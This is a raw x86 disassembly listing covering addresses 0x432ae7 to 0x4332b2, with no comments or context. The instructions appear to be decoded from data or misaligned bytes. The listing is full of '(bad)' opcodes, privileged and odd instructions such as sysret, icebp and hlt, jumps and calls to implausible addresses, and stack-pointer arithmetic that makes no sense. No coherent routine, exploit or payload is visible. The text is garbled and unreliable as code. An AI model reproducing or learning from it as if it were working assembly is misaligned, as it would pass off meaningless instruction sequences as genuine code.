  432ae7:	mov    DWORD PTR [ebp-0xc],ecx
  432aea:	pcmpgtw mm0,mm0
  432aed:	add    dl,ah
  432aef:	leave  
  432af0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432af4:	push   eax
  432af5:	dec    ebp
  432af6:	mov    esi,DWORD PTR [ebx-0x75]
  432af9:	lea    ebp,[eax-0x7c00ff02]
  432aff:	xor    eax,DWORD PTR [eax]
  432b01:	sysret 
  432b03:	dec    ebp
  432b04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b0b:	push   WORD PTR [ecx+0x8]
  432b0f:	jne    0x432ad2
  432b11:	ud0    ecx,DWORD PTR [ecx]
  432b14:	mov    eax,edx
  432b16:	lods   al,BYTE PTR ds:[esi]
  432b17:	add    BYTE PTR [eax],al
  432b19:	data16 (bad) 
  432b1b:	iret   
  432b1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b23:	cli    
  432b24:	inc    ebp
  432b25:	cmp    al,0x8d
  432b27:	add    BYTE PTR [esi+0x2d],ah
  432b2a:	inc    ebp
  432b2b:	pop    ebp
  432b2c:	lea    ecx,[edi]
  432b2e:	mov    dl,bh
  432b30:	add    BYTE PTR [edi],cl
  432b32:	mov    DWORD PTR [eax+eax*8],edi
  432b35:	mov    ebx,0x3b87
  432b3a:	add    BYTE PTR [ebx],ch
  432b3c:	inc    ebp
  432b3d:	data16 (bad) 
  432b3f:	clc    
  432b40:	int3   
  432b41:	cmp    eax,DWORD PTR [eax]
  432b43:	je     0x432ace
  432b45:	push   0xffffffc8
  432b47:	pop    edi
  432b48:	xchg   DWORD PTR [ebp+0x0],eax
  432b4b:	data16 add BYTE PTR [ebp+0x45],cl
  432b4f:	lea    cx,[ebp+0x10]
  432b53:	jb     0x432b55
  432b55:	jmp    0x432ae0
  432b57:	call   eax
  432b59:	clc    
  432b5a:	xchg   DWORD PTR [edi+0x1],edi
  432b5d:	mov    eax,DWORD PTR [eax]
  432b5f:	or     BYTE PTR [ebp-0x49],al
  432b62:	lea    eax,[eax+0x74003154]
  432b68:	push   edi
  432b69:	inc    edx
  432b6a:	jge    0x432b6b
  432b6c:	mov    DWORD PTR [edi],ecx
  432b6e:	fdiv   DWORD PTR [edi-0x6]
  432b71:	inc    DWORD PTR [eax]
  432b73:	xor    edx,DWORD PTR [eax+0x5f]
  432b76:	xchg   DWORD PTR [ebx+0x1],ebx
  432b79:	ret    0x0
  432b7c:	xor    BYTE PTR [ebp-0x51],cl
  432b7f:	cmp    edi,0xf0ff89fe
  432b85:	data16 ror al,0x84
  432b89:	rol    BYTE PTR [eax],0x3b
  432b8c:	add    al,dh
  432b8e:	dec    eax
  432b8f:	xchg   esp,eax
  432b90:	push   ebx
  432b91:	jmp    0x432b1e
  432b93:	push   ebp
  432b94:	add    esp,ebp
  432b96:	add    ebp,esp
  432b98:	mov    edx,DWORD PTR [edi+0x24]
  432b9b:	clc    
  432b9c:	dec    esi
  432b9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ba3:	cmp    BYTE PTR [ebx],al
  432ba5:	jne    0x432b30
  432ba7:	xor    esp,eax
  432ba9:	jmp    0x462d2c
  432bae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bb1:	jne    0x432ba7
  432bb3:	call   0xffcd290d
  432bb8:	clc    
  432bb9:	xchg   edi,eax
  432bba:	sti    
  432bbb:	add    DWORD PTR [ebx],eax
  432bbd:	add    BYTE PTR [ebp+0x47],bl
  432bc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432bc6:	pop    ebp
  432bc7:	mov    DWORD PTR [esi-0x48],esi
  432bca:	jmp    0x432c13
  432bcc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432bd2:	(bad)  
  432bd4:	cmp    al,0x0
  432bd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432bd9:	lea    ebx,[ebp-0x56]
  432bdc:	jle    0x432bde
  432bde:	jae    0x432b69
  432be0:	mov    eax,esp
  432be2:	call   0xb900:0x8b005587
  432be9:	inc    ebp
  432bea:	push   ebp
  432beb:	lea    ecx,[ebp-0x27ff4f12]
  432bf1:	mov    eax,edi
  432bf3:	int3   
  432bf4:	push   ebp
  432bf5:	xchg   edi,eax
  432bf7:	add    esp,ebp
  432bf9:	add    BYTE PTR [eax],al
  432bfb:	inc    ebp
  432bfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432c02:	cld    
  432c03:	mov    DWORD PTR [edx],edi
  432c05:	aam    0x75
  432c07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c0d:	mov    DWORD PTR [ebx-0x50],edx
  432c10:	test   BYTE PTR [ebp-0x1],0xe8
  432c14:	mov    eax,DWORD PTR [eax]
  432c16:	hlt    
  432c17:	add    al,al
  432c19:	mov    eax,DWORD PTR ds:0x890045a8
  432c1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c25:	inc    DWORD PTR [eax*2+0xf75854d]
  432c2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c32:	call   0x72998973
  432c37:	je     0x432c97
  432c39:	js     0x432c9a
  432c3b:	lock ret 0x7e
  432c3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c45:	mov    edi,edi
  432c47:	sbb    al,bl
  432c49:	clc    
  432c4a:	add    BYTE PTR [ebp-0x73],bh
  432c4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c53:	ror    BYTE PTR [eax],1
  432c55:	dec    ebp
  432c56:	xchg   ebp,eax
  432c57:	mov    edi,edi
  432c59:	in     al,0x8b
  432c5b:	jge    0x432be6
  432c5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432c63:	clc    
  432c64:	pop    esi
  432c65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432c6b:	clc    
  432c6c:	add    al,0x6e
  432c6e:	mov    eax,DWORD PTR [ebx]
  432c70:	mov    BYTE PTR [ebp+0x0],dl
  432c73:	mov    edx,DWORD PTR [ebx-0x20]
  432c76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432c7c:	add    eax,0x3b3b73
  432c81:	adc    al,0x89
  432c83:	pop    eax
  432c84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432c88:	ret    0xf08
  432c8b:	cmp    al,0x2
  432c8d:	mov    edx,eax
  432c8f:	cld    
  432c90:	add    BYTE PTR [ebp+0x66],dl
  432c93:	add    eax,ebx
  432c95:	add    esp,eax
  432c97:	sub    eax,eax
  432c99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432c9f:	add    BYTE PTR [eax],al
  432ca1:	mov    DWORD PTR [ebx-0x24],ebx
  432ca4:	push   edi
  432ca5:	push   ebp
  432ca6:	clc    
  432ca7:	add    DWORD PTR [esi+0x1b0100],0x45
  432cae:	out    0xff,eax
  432cb0:	add    edx,DWORD PTR [eax]
  432cb2:	jmp    0x432c9c
  432cb4:	cmp    ch,0x46
  432cb7:	(bad)  
  432cb8:	jmp    0x40c8b50a
  432cbd:	je     0x432c49
  432cbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432cc5:	inc    ebp
  432cc6:	add    BYTE PTR [ebx-0x770375],al
  432ccc:	add    ah,ch
  432cce:	add    edx,esp
  432cd0:	pop    edi
  432cd1:	pop    ebp
  432cd2:	push   ebp
  432cd3:	inc    ebx
  432cd4:	in     al,dx
  432cd5:	pop    ebp
  432cd6:	in     al,dx
  432cd7:	cmp    edx,DWORD PTR [edi-0x8]
  432cda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432ce1:	add    al,0x47
  432ce3:	push   ebp
  432ce4:	mov    esp,ebp
  432ce6:	in     al,0x45
  432ce8:	dec    ebp
  432ce9:	push   esi
  432cea:	test   DWORD PTR [eax+0xfb010f],esi
  432cf0:	add    BYTE PTR [eax+0xc018b],dh
  432cf6:	leave  
  432cf7:	inc    ebp
  432cf8:	test   al,ch
  432cfa:	add    dh,bh
  432cfc:	add    bh,bh
  432cfe:	dec    ebp
  432cff:	push   cs
  432d00:	mov    DWORD PTR [ecx],eax
  432d02:	hlt    
  432d03:	push   es
  432d04:	dec    ebp
  432d05:	leave  
  432d06:	mov    DWORD PTR [eax],ecx
  432d08:	clc    
  432d09:	cmovge eax,ecx
  432d0c:	mov    ecx,0x85c2f0
  432d12:	clc    
  432d13:	pop    DWORD PTR [ebp+0x1]
  432d16:	push   ebx
  432d17:	add    BYTE PTR [ebp-0x15],bh
  432d1a:	push   esi
  432d1b:	xor    eax,0x898a45
  432d20:	cld    
  432d21:	add    al,BYTE PTR [ebp+0x0]
  432d24:	xor    esp,DWORD PTR [esi-0x64]
  432d27:	add    DWORD PTR [esi+0x78308c1],edi
  432d2d:	add    ah,BYTE PTR [ebp-0x49]
  432d30:	int    0xbb
  432d32:	mov    ecx,DWORD PTR [esi+0xc]
  432d35:	add    dh,al
  432d37:	cmp    ecx,ebx
  432d39:	jne    0x432d03
  432d3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432d3e:	jmp    0xca2d44
  432d43:	add    DWORD PTR [ebp+0x0],eax
  432d46:	mov    eax,ebx
  432d48:	or     al,0x8b
  432d4a:	(bad)  
  432d4b:	mov    ecx,esi
  432d4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432d54:	mov    eax,edi
  432d56:	or     BYTE PTR [edx],cl
  432d58:	shl    cl,cl
  432d5a:	icebp  
  432d5b:	add    BYTE PTR [ebp+0x38],0x8b
  432d5f:	or     BYTE PTR [edx+eax*2],cl
  432d62:	(bad)  
  432d63:	or     cl,dh
  432d65:	stc    
  432d66:	shl    DWORD PTR [ebp-0x30],0xc6
  432d6a:	xor    al,0x0
  432d6c:	inc    ebp
  432d6d:	xchg   BYTE PTR [ebx],al
  432d6f:	add    esp,edi
  432d71:	add    BYTE PTR [ebp-0x39],cl
  432d74:	mov    al,bl
  432d76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432d7c:	sub    al,0xbf
  432d7e:	jmp    0x432d05
  432d80:	mov    edi,eax
  432d82:	lock jge 0x432d76
  432d85:	lea    esi,[edx-0x74bad5ff]
  432d8b:	mov    ebp,esp
  432d8d:	or     cl,dh
  432d8f:	leave  
  432d90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432d97:	dec    ebp
  432d98:	dec    ebp
  432d99:	test   DWORD PTR [ebx],eax
  432d9b:	paddb  mm6,mm0
  432d9e:	add    DWORD PTR [eax],eax
  432da0:	dec    ebp
  432da1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432da7:	mov    esi,DWORD PTR [edx]
  432da9:	or     al,0x2b
  432dab:	dec    ebp
  432dac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432db2:	mov    esp,edi
  432db4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dbb:	mov    DWORD PTR [ebx],ebp
  432dbd:	call   0xc76b6ed
  432dc2:	mov    DWORD PTR [ebp+0x10],ecx
  432dc5:	(bad)  
  432dc6:	push   0x8b85ff10
  432dcb:	clc    
  432dcc:	or     al,0x54
  432dce:	(bad)  
  432dcf:	push   ecx
  432dd0:	retf   
  432dd1:	mov    ebx,0xff4d8dc8
  432dd6:	mov    DWORD PTR [ebp+0x8],eax
  432dd9:	xor    eax,DWORD PTR [ebp-0x75]
  432ddc:	cmp    ebp,DWORD PTR [ebx]
  432dde:	lsl    ebx,WORD PTR [edi-0x8]
  432de2:	call   DWORD PTR [ebx-0x741bff75]
  432de8:	(bad)  
  432de9:	or     al,0x5b
  432deb:	dec    ebp
  432dec:	or     BYTE PTR [ebx],dh
  432dee:	inc    ebp
  432def:	xor    esi,DWORD PTR ds:0x708088d
  432df5:	in     eax,0x9b
  432df7:	add    BYTE PTR [edx],dh
  432df9:	inc    ebp
  432dfa:	pop    edi
  432dfb:	xor    eax,edx
  432dfd:	test   DWORD PTR [eax],0x81108b8b
  432e03:	dec    ebp
  432e04:	sub    al,0x33
  432e06:	add    BYTE PTR [ebx],dh
  432e08:	push   esi
  432e09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e0f:	mov    edi,eax
  432e11:	or     BYTE PTR [ebp+0x45],al
  432e14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e1a:	xor    ecx,ecx
  432e1c:	pushf  
  432e1d:	push   es
  432e1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432e25:	dec    ebp
  432e26:	inc    ebp
  432e27:	cmp    BYTE PTR [ecx],0x54
  432e2a:	pushf  
  432e2b:	gs (bad) 
  432e2d:	shl    esp,1
  432e2f:	dec    ebp
  432e30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432e36:	shr    ecx,1
  432e38:	xlat   BYTE PTR ds:[ebx]
  432e39:	rol    bh,cl
  432e3b:	mov    edx,esp
  432e3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432e43:	mov    ecx,DWORD PTR [eax]
  432e45:	or     BYTE PTR [eax],al
  432e47:	push   ebp
  432e48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e4e:	dec    ebp
  432e4f:	enter  0xceba,0x8
  432e53:	retf   0x1807
  432e56:	ret    0x9b4d
  432e59:	mov    esi,DWORD PTR [edx]
  432e5b:	or     al,0x33
  432e5d:	into   
  432e5e:	add    edx,esi
  432e60:	add    ecx,edx
  432e62:	bswap  eax
  432e64:	ror    esi,0x98
  432e67:	dec    ebp
  432e68:	add    cl,ch
  432e6a:	mov    edi,edi
  432e6c:	hlt    
  432e6d:	inc    esi
  432e6f:	inc    ebp
  432e70:	ret    0x4533
  432e73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432e79:	or     BYTE PTR [ebx],dh
  432e7b:	dec    ebp
  432e7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432e82:	jne    0xff8d2e49
  432e88:	inc    ebp
  432e89:	inc    ebp
  432e8a:	mov    esi,DWORD PTR [ebx]
  432e8c:	clc    
  432e8d:	pop    esi
  432e8e:	ret    0xcaeb
  432e91:	mov    eax,esi
  432e93:	call   0x52048366
  432e98:	dec    ebp
  432e99:	add    eax,0xf8728b
  432e9e:	adc    eax,0xce0ccac9
  432ea3:	push   ebp
  432ea4:	ret    0xc6ec
  432ea7:	in     al,dx
  432ea8:	call   0x33437bb1
  432ead:	push   edi
  432eae:	add    edi,eax
  432eb0:	xor    eax,eax
  432eb2:	jmp    0x432ef9
  432eb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432eba:	add    eax,edi
  432ebc:	shr    eax,cl
  432ebe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432ec4:	mov    esi,DWORD PTR [edx]
  432ec6:	in     al,dx
  432ec7:	pushf  
  432ec8:	ret    0x84c7
  432ecb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432ed1:	inc    ebp
  432ed2:	in     al,dx
  432ed3:	xor    DWORD PTR [ebp-0x64],eax
  432ed6:	mov    eax,edi
  432ed8:	cld    
  432ed9:	fmul   st(2),st
  432edb:	sbb    dl,al
  432edd:	jmp    0x9c3b:0x304d45c1
  432ee4:	jbe    0x432ead
  432ee6:	mov    esp,eax
  432ee8:	clc    
  432ee9:	add    BYTE PTR [ebp+0x0],cl
  432eec:	mov    ecx,ecx
  432eee:	lea    eax,[ebp-0x5]
  432ef1:	mov    edi,edi
  432ef3:	call   0x51ce833d
  432ef8:	hlt    
  432ef9:	xor    eax,edx
  432efb:	mov    esi,0x9b7284
  432f00:	xor    cl,dl
  432f02:	mov    esi,eax
  432f04:	hlt    
  432f05:	into   
  432f06:	inc    ebp
  432f07:	scas   eax,DWORD PTR es:[edi]
  432f08:	mov    ebp,ecx
  432f0a:	cld    
  432f0b:	add    dl,cl
  432f0d:	add    dl,al
  432f0f:	inc    ebp
  432f10:	shr    DWORD PTR [ebx],0x4d
  432f13:	xor    edi,DWORD PTR [ebx]
  432f15:	mov    DWORD PTR [edi],ecx
  432f17:	clc    
  432f18:	dec    esi
  432f19:	inc    ebp
  432f1a:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f20:	ret    0xc6ca
  432f23:	mov    BYTE PTR [ebp-0x32],0x53
  432f27:	scas   eax,DWORD PTR es:[edi]
  432f28:	inc    ebp
  432f29:	jmp    0x432f5b
  432f2b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f32:	pop    ebx
  432f33:	xor    ecx,DWORD PTR [ebp+0x3]
  432f36:	mov    eax,DWORD PTR [ebx]
  432f38:	clc    
  432f39:	test   edx,ecx
  432f3b:	mov    ecx,esi
  432f3d:	cld    
  432f3e:	call   0x8ab77488
  432f43:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f49:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f4f:	fdiv   QWORD PTR [ebx]
  432f51:	retf   0xce89
  432f54:	in     al,0xc1
  432f56:	inc    ebp
  432f57:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432f5d:	into   
  432f5e:	mov    dh,0xc1
  432f61:	call   0x8c1774ea
  432f66:	(bad)  
  432f67:	cld    
  432f68:	mov    ecx,DWORD PTR [ebp-0x14]
  432f6b:	xor    eax,ecx
  432f6d:	lea    eax,[ebp+0x8]
  432f70:	mov    esi,DWORD PTR [edx-0x4]
  432f73:	add    dl,al
  432f75:	inc    ebp
  432f76:	mov    esp,0x32d89b8b
  432f7b:	dec    ebp
  432f7c:	mov    esi,DWORD PTR [ebx]
  432f7e:	cld    
  432f7f:	xor    eax,edx
  432f81:	sub    esp,DWORD PTR [ebp-0x75]
  432f84:	int    0xec
  432f86:	sub    ecx,eax
  432f88:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432f8e:	mov    esi,esp
  432f90:	call   0x34177d19
  432f95:	inc    DWORD PTR [ebx]
  432f97:	mov    edi,DWORD PTR [ebx]
  432f99:	cld    
  432f9a:	jne    0x432fe9
  432f9c:	mov    esi,DWORD PTR [ebx]
  432f9e:	aam    0x8d
  432fa0:	dec    ebp
  432fa1:	or     BYTE PTR [ebx],dh
  432fa3:	jb     0x432fa8
  432fa5:	add    BYTE PTR [edi+0x45],bl
  432fa8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432faf:	xor    ebp,esp
  432fb1:	xor    eax,edi
  432fb3:	sub    edi,esp
  432fb5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  432fbb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432fc2:	inc    ebp
  432fc3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432fc9:	clc    
  432fca:	mov    eax,edi
  432fcc:	nop
  432fcd:	fadd   QWORD PTR [eax]
  432fcf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432fd5:	jmp    0x432f60
  432fd7:	mov    eax,DWORD PTR [ecx]
  432fd9:	fadd   DWORD PTR [eax]
  432fdb:	inc    ebp
  432fdc:	or     DWORD PTR [ebx],esi
  432fde:	dec    eax
  432fdf:	add    edx,DWORD PTR [ebx-0x2d]
  432fe2:	dec    ebp
  432fe3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432fe9:	inc    ebp
  432fea:	push   esp
  432feb:	mov    dl,BYTE PTR [ecx-0xd]
  432fee:	xor    ecx,DWORD PTR [ebp-0x45]
  432ff1:	(bad)  
  432ff3:	rol    BYTE PTR [eax],0xc1
  432ff6:	ret    
  432ff7:	inc    ebp
  432ff8:	inc    ebp
  432ff9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  432fff:	xor    eax,ebx
  433001:	add    eax,DWORD PTR [ebp+0x23]
  433004:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43300a:	cmp    edi,0xc
  43300d:	dec    ebp
  43300e:	inc    ebp
  43300f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433015:	inc    ebp
  433016:	mov    esi,DWORD PTR [ebx]
  433018:	clc    
  433019:	lea    eax,[ebp+0x45725407]
  43301f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433023:	xor    edi,DWORD PTR [eax]
  433025:	mov    ecx,0xff8b8d4d
  43302a:	push   esp
  43302b:	enter  0x4df7,0x23
  43302f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433035:	mov    eax,DWORD PTR [ebx]
  433037:	loopne 0x433024
  433039:	ret    0xc68b
  43303c:	push   esp
  43303d:	enter  0x9745,0x8b
  433041:	inc    ebp
  433042:	cld    
  433043:	mov    eax,edi
  433045:	clc    
  433046:	ret    
  433047:	ret    0xc645
  43304a:	mov    esi,DWORD PTR [ebx]
  43304c:	cld    
  43304d:	pop    esi
  43304e:	mov    ebx,0x83458bc3
  433054:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433058:	dec    ebp
  433059:	xor    DWORD PTR [ebx],esi
  43305b:	pushf  
  43305c:	add    edi,DWORD PTR [edx-0x7767a77]
  433062:	fcom   DWORD PTR [ebp+0x45]
  433065:	mov    esi,DWORD PTR [ebx]
  433067:	adc    al,0x9c
  433069:	inc    ebp
  43306a:	(bad)  
  43306b:	mov    ebx,eax
  43306d:	adc    al,0x85
  43306f:	cmp    al,0x1
  433072:	inc    ebp
  433073:	add    BYTE PTR ds:0xe98b9c4d,bh
  433079:	mov    eax,DWORD PTR [ebx]
  43307b:	nop
  43307c:	add    BYTE PTR [eax],al
  43307e:	inc    ebp
  43307f:	mov    esi,DWORD PTR [ebx]
  433081:	add    eax,DWORD PTR [ebx]
  433083:	cmp    al,0x89
  433085:	mov    esp,esi
  433087:	clc    
  433088:	inc    ebp
  433089:	inc    ebp
  43308a:	add    edx,DWORD PTR [esi+0xc]
  43308d:	mov    edi,0x7ff0845
  433092:	in     al,dx
  433093:	(bad)  
  433094:	jne    0x433031
  433096:	mov    esi,DWORD PTR [edx]
  433098:	clc    
  433099:	add    ebp,DWORD PTR [esi]
  43309b:	mov    edi,edi
  43309d:	in     al,dx
  43309e:	mov    DWORD PTR [ebp-0x10],eax
  4330a1:	xor    eax,DWORD PTR [ebp+0x3]
  4330a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4330aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4330b0:	lea    ecx,[ecx+0x45e8d4bc]
  4330b6:	clc    
  4330b7:	mov    edi,edi
  4330b9:	cmp    BYTE PTR [ebp+0x4d],al
  4330bc:	test   DWORD PTR [eax+0x74],ecx
  4330bf:	inc    ecx
  4330c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4330c6:	ret    
  4330c7:	inc    eax
  4330c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4330ce:	push   eax
  4330cf:	dec    eax
  4330d0:	test   al,0xd0
  4330d2:	dec    eax
  4330d4:	mov    eax,DWORD PTR [ebp-0x14]
  4330d7:	mov    eax,DWORD PTR [ebp+0x38]
  4330da:	mov    eax,ecx
  4330dc:	fadd   DWORD PTR [ebx]
  4330de:	dec    ebp
  4330df:	inc    eax
  4330e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4330e6:	inc    ebp
  4330e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4330ed:	fadd   QWORD PTR [ebx]
  4330ef:	inc    ebp
  4330f0:	or     al,0x33
  4330f2:	dec    ebp
  4330f3:	add    edi,DWORD PTR [ebx]
  4330f5:	mov    DWORD PTR [edx-0x28],esi
  4330f8:	mov    eax,DWORD PTR [ebp-0x10]
  4330fb:	mov    eax,DWORD PTR [eax+0x10]
  4330fe:	mov    eax,edi
  433100:	lock ret 
  433102:	inc    ecx
  433103:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433109:	fsubr  st,st(5)
  43310b:	test   DWORD PTR [eax],eax
  43310d:	clc    
  43310e:	push   0x45
  433110:	(bad)  
  433111:	cmp    al,0xec
  433113:	pushf  
  433114:	inc    ebp
  433115:	(bad)  
  433116:	push   eax
  433117:	fsub   DWORD PTR [eax-0x7b]
  43311a:	(bad)  
  43311b:	clc    
  43311c:	mov    eax,0xf8008584
  433121:	mov    eax,DWORD PTR [ebp-0x4]
  433124:	mov    edi,0x4585c3cc
  43312a:	clc    
  43312b:	mov    eax,DWORD PTR [ebp+0x14]
  43312e:	xor    eax,DWORD PTR [ebp-0x64]
  433131:	mov    edi,eax
  433133:	in     al,dx
  433134:	les    esi,FWORD PTR [ebp-0x7b]
  433137:	mov    edi,eax
  433139:	or     al,0x4d
  43313b:	dec    ebp
  43313c:	mov    eax,ebp
  43313e:	in     al,0xf2
  433140:	dec    ebp
  433141:	dec    DWORD PTR [ecx+0x4dc7e045]
  433147:	fmul   DWORD PTR [ecx+0x4df8f085]
  43314d:	inc    ebp
  43314e:	mov    DWORD PTR [ebx],esi
  433150:	fadd   QWORD PTR [ebx]
  433152:	dec    ebp
  433153:	push   eax
  433154:	xor    eax,DWORD PTR [ebp+0x3]
  433157:	push   eax
  433158:	mov    DWORD PTR [eax+ebx*8],ebx
  43315b:	push   esi
  43315d:	mov    eax,DWORD PTR [eax]
  43315f:	lock cmp eax,0xf84e85c0
  433165:	inc    ebp
  433166:	test   BYTE PTR [ebx],dh
  433168:	add    DWORD PTR [ebx],eax
  43316a:	add    BYTE PTR [eax+0x4d],dl
  43316d:	jne    0x4331a2
  43316f:	lea    ecx,[ebx-0x7617fc44]
  433175:	div    ah
  433177:	inc    DWORD PTR [ebp+0x45]
  43317a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433180:	jb     0x43310d
  433182:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433189:	mov    ecx,DWORD PTR [ebp-0x10]
  43318c:	xor    ecx,DWORD PTR [ebp+0x3]
  43318f:	mov    edi,DWORD PTR [ebx]
  433191:	adc    BYTE PTR [ebp+0x41],dh
  433194:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43319a:	ret    
  43319b:	push   ss
  43319c:	push   0x45
  43319e:	lea    ecx,[ebx+0x4de80cb0]
  4331a4:	sti    
  4331a5:	add    edi,edi
  4331a7:	or     BYTE PTR [ebp+0x4d],al
  4331aa:	mov    ebp,DWORD PTR [ebx]
  4331ac:	xor    ebp,ecx
  4331ae:	mov    al,BYTE PTR [edx]
  4331b0:	add    eax,0xc7200
  4331b5:	jne    0x433204
  4331b7:	lea    esi,[ebx]
  4331b9:	mov    al,0xf
  4331bb:	call   0xf2880
  4331c0:	shl    DWORD PTR [ecx],0x84
  4331c3:	pushf  
  4331c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4331ca:	mov    esi,DWORD PTR [edx]
  4331cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4331d3:	test   DWORD PTR [eax],eax
  4331d5:	clc    
  4331d6:	dec    ebp
  4331d7:	inc    ebp
  4331d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4331db:	pushf  
  4331dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4331e3:	lea    eax,[ecx]
  4331e5:	int3   
  4331e6:	add    BYTE PTR [ebp+0x45],cl
  4331e9:	lea    ecx,[ebx-0x75b2cc38]
  4331ef:	lea    eax,ds:0x4d72c4
  4331f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4331f8:	xor    ecx,edi
  4331fa:	bswap  ebx
  4331fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433200:	rol    DWORD PTR [ecx],0x84
  433203:	add    BYTE PTR [ecx],al
  433205:	xor    eax,DWORD PTR [eax]
  433207:	pushf  
  433208:	inc    ebp
  433209:	jnp    0x8a43660c
  43320f:	mov    eax,DWORD PTR ds:0xcf72e8
  433215:	lock dec ebp
  433217:	retf   
  433218:	xor    ecx,DWORD PTR [ebp+0xf]
  43321b:	mov    eax,eax
  43321d:	fmul   st,st(3)
  43321f:	test   ecx,0x19b8484
  433225:	xor    al,BYTE PTR [eax]
  433227:	mov    DWORD PTR [ebp-0x28],eax
  43322a:	mov    eax,DWORD PTR [ebp+0x33]
  43322d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433233:	ret    
  433234:	add    al,cl
  433236:	dec    ebp
  433237:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43323d:	add    ecx,DWORD PTR ds:0xc7250
  433243:	inc    ebp
  433244:	rcl    DWORD PTR [eax+0x4d],0x2b
  433248:	mov    edi,edi
  43324a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433250:	jb     0x433219
  433252:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433259:	mov    esi,DWORD PTR [ebx]
  43325b:	cld    
  43325c:	mov    cl,bh
  43325e:	or     eax,0x372b6
  433263:	cmp    ecx,eax
  433265:	jne    0x4332e2
  43326b:	mov    eax,DWORD PTR [ebp-0x20]
  43326e:	mov    eax,DWORD PTR [eax]
  433270:	xor    eax,edi
  433272:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433279:	mov    ecx,DWORD PTR [ebp-0x4]
  43327c:	mov    ecx,edi
  43327e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433284:	jb     0x433295
  433286:	add    BYTE PTR [edi-0x3f],dl
  433289:	add    BYTE PTR [ebp-0x75],cl
  43328c:	mov    esi,eax
  43328e:	xor    eax,DWORD PTR [eax]
  433290:	mov    al,bh
  433292:	or     eax,0x4b7284
  433297:	xor    al,cl
  433299:	mov    ecx,DWORD PTR [ebp-0x4]
  43329c:	mov    ecx,edi
  43329e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332a4:	jb     0x4332b5
  4332a6:	add    BYTE PTR [edi],dh
  4332a8:	enter  0x8500,0x8b
  4332ac:	add    ah,bl
  4332ae:	add    BYTE PTR [eax],al
  4332b0:	inc    ebp
  4332b1:	(bad)  
  4332b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
